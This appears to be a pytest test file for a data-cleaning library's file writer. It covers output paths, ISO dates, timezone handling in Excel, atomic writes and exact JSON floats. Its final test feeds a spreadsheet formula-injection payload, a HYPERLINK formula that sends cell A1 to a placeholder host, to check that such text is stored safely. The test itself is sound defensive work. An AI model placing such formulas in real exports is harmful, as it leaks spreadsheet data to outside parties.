"""
test_clean_io.py — Writing cleaned frames: output paths, ISO dates in
CSV/JSON, Review Focus 3 (timezone-aware datetimes in .xlsx), and
atomic writes (a failed write never leaves a partial file or damages
an earlier output).
"""

from __future__ import annotations

import json
from pathlib import Path

import pandas as pd
import pytest

import datadelta.clean.io as clean_io
from datadelta.clean.io import SUPPORTED_OUTPUTS, default_output_path, write_frame
from datadelta.loader   import load_file


@pytest.fixture
def frame() -> pd.DataFrame:
    return pd.DataFrame({
        "id":      pd.Series([1, None, 3], dtype="Int64"),
        "amount":  pd.Series([1.5, None, 2.25], dtype="Float64"),
        "paid":    pd.Series([True, None, False], dtype="boolean"),
        "region":  pd.Series(["EMEA", None, "地区"], dtype=object),
        "day":     pd.to_datetime(pd.Series(["2024-01-05", None, "2024-01-07"])),
        "stamp":   pd.to_datetime(pd.Series(["2024-01-05 10:30:00", None, "2024-01-07 08:00:15"])),
        "aware":   pd.to_datetime(pd.Series(["2024-01-05 10:30", None, "2024-07-07 08:00"]))
                     .dt.tz_localize("Europe/Berlin"),
    })


# ── default_output_path ───────────────────────────────────────────────────────

@pytest.mark.parametrize("source, expected", [
    ("data/orders.csv",      Path("data/orders.clean.csv")),
    ("orders.parquet",       Path("orders.clean.parquet")),
    ("dir/book.xlsx",        Path("dir/book.clean.xlsx")),
    ("events.json",          Path("events.clean.json")),
])
def test_default_output_path_sits_next_to_the_input(source, expected):
    assert default_output_path(source) == expected


@pytest.mark.parametrize("source", [
    "postgresql://user:pw@host/db::orders",
    "sqlite:///data/shop.db::orders",
    "shop.sqlite",
    "legacy.xls",
])
def test_default_output_path_needs_o_for_other_sources(source):
    with pytest.raises(ValueError, match="-o"):
        default_output_path(source)


def test_supported_outputs():
    assert SUPPORTED_OUTPUTS == frozenset({".csv", ".parquet", ".xlsx", ".json"})


def test_unsupported_suffix_is_rejected(tmp_path, frame):
    with pytest.raises(ValueError, match="unsupported output format '.txt'"):
        write_frame(frame, tmp_path / "out.txt")


# ── CSV / JSON: ISO 8601 dates ────────────────────────────────────────────────

def test_csv_writes_iso_dates_and_keeps_offsets(tmp_path, frame):
    path = tmp_path / "out.csv"
    write_frame(frame, path)
    lines = path.read_text(encoding="utf-8").splitlines()
    assert lines[0] == "id,amount,paid,region,day,stamp,aware"
    assert lines[1] == "1,1.5,True,EMEA,2024-01-05,2024-01-05T10:30:00,2024-01-05T10:30:00+01:00"
    assert lines[2] == ",,,,,,"
    assert lines[3] == "3,2.25,False,地区,2024-01-07,2024-01-07T08:00:15,2024-07-07T08:00:00+02:00"


def test_json_is_records_with_iso_dates_and_nulls(tmp_path, frame):
    path = tmp_path / "out.json"
    write_frame(frame, path)
    records = json.loads(path.read_text(encoding="utf-8"))
    assert records[0] == {
        "id": 1, "amount": 1.5, "paid": True, "region": "EMEA", "day": "2024-01-05",
        "stamp": "2024-01-05T10:30:00", "aware": "2024-01-05T10:30:00+01:00",
    }
    assert set(records[1].values()) == {None}
    assert records[2]["region"] == "地区"
    assert "地区" in path.read_text(encoding="utf-8")                  # not \u-escaped


def test_fractional_seconds_are_kept(tmp_path):
    df = pd.DataFrame({"t": pd.to_datetime(["2024-01-05 10:30:00.5", "2024-01-05 10:30:01"], format="ISO8601")})
    path = tmp_path / "out.csv"
    write_frame(df, path)
    assert path.read_text(encoding="utf-8").splitlines()[1:] == [
        "2024-01-05T10:30:00.500000", "2024-01-05T10:30:01.000000",
    ]


# ── XLSX: Review Focus 3 ──────────────────────────────────────────────────────

def test_xlsx_converts_timezone_aware_datetimes_to_naive_utc(tmp_path, frame):
    """Review Focus 3: openpyxl rejects tz-aware values; they are written as naive UTC."""
    path = tmp_path / "out.xlsx"
    write_frame(frame, path)

    back = pd.read_excel(path, engine="openpyxl")
    assert back["aware"].iloc[0] == pd.Timestamp("2024-01-05 09:30:00")    # 10:30 +01:00
    assert back["aware"].iloc[2] == pd.Timestamp("2024-07-07 06:00:00")    # 08:00 +02:00
    assert back["day"].iloc[0] == pd.Timestamp("2024-01-05")
    assert back["region"].tolist()[2] == "地区"
    assert frame["aware"].dt.tz is not None                                 # input untouched


def test_plain_pandas_would_fail_on_timezones(tmp_path, frame):
    """Documents why write_frame converts: the direct call raises."""
    with pytest.raises(ValueError, match="timezones"):
        frame.to_excel(tmp_path / "direct.xlsx", index=False, engine="openpyxl")


# ── Parquet ───────────────────────────────────────────────────────────────────

def test_parquet_round_trips_types_through_the_loader(tmp_path, frame):
    path = tmp_path / "out.parquet"
    write_frame(frame, path)
    back = load_file(str(path))
    assert list(back.columns) == list(frame.columns)
    assert back["id"].iloc[0] == 1 and back["id"].iloc[2] == 3
    assert pd.api.types.is_datetime64_any_dtype(back["day"])
    assert back["aware"].iloc[0] == frame["aware"].iloc[0]                  # same instant
    assert back["region"].iloc[2] == "地区"


@pytest.mark.parametrize("suffix", [".csv", ".json", ".xlsx", ".parquet"])
def test_every_format_is_readable_by_the_loader(tmp_path, frame, suffix):
    path = tmp_path / f"out{suffix}"
    write_frame(frame, path)
    back = load_file(str(path))
    assert len(back) == 3
    assert list(back.columns) == list(frame.columns)


# ── Atomic writes and write errors ────────────────────────────────────────────

def listing(directory: Path) -> list[str]:
    return sorted(p.name for p in directory.iterdir())


@pytest.mark.parametrize("suffix", [".csv", ".json", ".xlsx", ".parquet"])
def test_unwritable_target_raises_a_write_error_naming_path_and_cause(tmp_path, frame, suffix):
    """Every writer's failure (DuckDB's IOException is not an OSError) arrives as one OSError."""
    target = tmp_path / "nodir" / f"out{suffix}"
    with pytest.raises(OSError) as raised:
        write_frame(frame, target)

    error = raised.value
    assert isinstance(error, clean_io.WriteError)
    message = str(error)
    assert message.startswith(f"could not write {target}: ")
    assert len(message.splitlines()) == 1
    assert len(message) > len(f"could not write {target}: ")        # a cause follows the path
    assert error.__cause__ is not None
    assert not (tmp_path / "nodir").exists()


def test_failed_write_leaves_an_earlier_output_untouched_and_no_temp_file(tmp_path, frame):
    """openpyxl rejects control characters only while saving, after it has started the file."""
    target = tmp_path / "out.xlsx"
    write_frame(frame, target)
    good = target.read_bytes()
    before = listing(tmp_path)

    bad = pd.DataFrame({"note": ["fine", "bell\x01char"]})
    with pytest.raises(clean_io.WriteError) as raised:
        write_frame(bad, target)

    assert target.read_bytes() == good
    assert listing(tmp_path) == before
    message = str(raised.value)
    assert len(message.splitlines()) == 1
    assert "\x01" not in message and "\\x01" in message              # shown escaped, never raw


def test_failed_write_creates_no_file_when_there_was_none(tmp_path):
    bad = pd.DataFrame({"note": ["bell\x01char"]})
    with pytest.raises(clean_io.WriteError):
        write_frame(bad, tmp_path / "out.xlsx")
    assert listing(tmp_path) == []


@pytest.mark.parametrize("suffix", [".csv", ".json", ".xlsx", ".parquet"])
def test_successful_write_replaces_the_target_and_leaves_no_temp_file(tmp_path, frame, suffix):
    target = tmp_path / f"out{suffix}"
    target.write_bytes(b"stale")
    write_frame(frame, target)
    assert listing(tmp_path) == [target.name]
    assert len(load_file(str(target))) == 3


def test_the_target_is_replaced_only_after_the_temp_file_is_complete(tmp_path, frame, monkeypatch):
    """The temp file sits next to the target (same filesystem) and is complete when it is moved."""
    target = tmp_path / "out.csv"
    moves = []
    real_replace = clean_io.os.replace

    def spy(src, dst):
        moves.append((Path(src), Path(dst), Path(src).read_text(encoding="utf-8")))
        real_replace(src, dst)

    monkeypatch.setattr(clean_io.os, "replace", spy)
    write_frame(frame, target)

    [(src, dst, content)] = moves
    assert dst == target and src != target and src.parent == target.parent
    assert content.splitlines()[0] == "id,amount,paid,region,day,stamp,aware"
    assert not src.exists()


def test_a_failing_final_move_is_a_write_error_and_removes_the_temp_file(tmp_path, frame):
    target = tmp_path / "out.csv"
    target.mkdir()                                  # os.replace cannot put a file over a directory
    with pytest.raises(clean_io.WriteError, match="could not write"):
        write_frame(frame, target)
    assert listing(tmp_path) == ["out.csv"] and target.is_dir()
    assert listing(target) == []


# ── JSON: floats are written exactly ──────────────────────────────────────────

def test_json_keeps_every_float_digit(tmp_path):
    """pandas' to_json rounds to 10 decimals by default: 1e-12 became 0.0, silently."""
    values = [0.12345678901234, 1e-12, 3.000000000001, 1234567.891234568, 0.1 + 0.2, -2.5e-300]
    df = pd.DataFrame({
        "f":  pd.Series(values, dtype="float64"),
        "nf": pd.Series(values, dtype="Float64"),
    })
    path = tmp_path / "out.json"
    write_frame(df, path)

    records = json.loads(path.read_text(encoding="utf-8"))
    assert [r["f"] for r in records] == values
    assert [r["nf"] for r in records] == values


def test_json_writes_other_cells_as_json_values(tmp_path):
    from datetime import time
    df = pd.DataFrame({
        "big":   pd.Series([2 ** 62 + 1, 3], dtype="int64"),
        "t":     pd.Series([time(8, 30), None], dtype=object),
        "obj":   pd.Series([{"k": [1, 2]}, None], dtype=object),
        "name":  pd.Series(["地区", "x"], dtype=object),
    })
    path = tmp_path / "out.json"
    write_frame(df, path)
    records = json.loads(path.read_text(encoding="utf-8"))
    assert records == [
        {"big": 2 ** 62 + 1, "t": "08:30:00", "obj": {"k": [1, 2]}, "name": "地区"},
        {"big": 3,           "t": None,       "obj": None,          "name": "x"},
    ]


# ── XLSX: text that starts with "=" stays text ────────────────────────────────

def test_xlsx_writes_text_starting_with_equals_as_text_not_formulas(tmp_path):
    """openpyxl turns any str starting with "=" into a live formula (CWE-1236) with no cached value."""
    import openpyxl
    notes = ["=1+2", '=HYPERLINK("http://example.invalid/?q="&A1,"open")', "=== header ===", "plain", "="]
    df = pd.DataFrame({"=title": notes, "n": [1, 2, 3, 4, 5]})
    path = tmp_path / "out.xlsx"
    write_frame(df, path)

    sheet = openpyxl.load_workbook(path).active
    cells = [c for row in sheet.iter_rows() for c in row]
    assert [c.data_type for c in cells if c.data_type == "f"] == []
    assert sheet["A1"].value == "=title"
    assert [sheet.cell(row=i + 2, column=1).value for i in range(len(notes))] == notes
    assert load_file(str(path))["=title"].tolist() == notes
